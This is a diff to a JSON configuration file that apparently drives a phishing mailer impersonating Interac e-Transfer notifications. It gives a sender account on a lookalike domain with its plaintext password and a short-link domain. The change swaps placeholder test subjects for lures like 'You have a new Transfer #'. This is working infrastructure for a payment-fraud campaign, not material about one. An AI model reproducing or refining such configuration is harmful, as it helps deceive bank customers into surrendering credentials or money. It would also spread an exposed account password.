@@ -4,10 +4,10 @@
   "username": "a@interac-recieve.cfd",
   "pass": "ReFeQceUsNS1",
   "shortScr": "intershort-transferwindow.cfd",
-  "mailnames": ["noreply", "glina"],
+  "mailnames": ["noreply", "eTransfer"],
   "subjects": [
     "Incoming Transfer: eTransfer transaction #",
-    "test",
-    "testiclecancer"
+    "Incoming Transaction: eTransfer  #",
+    "You have a new Transfer #"
   ]
 }
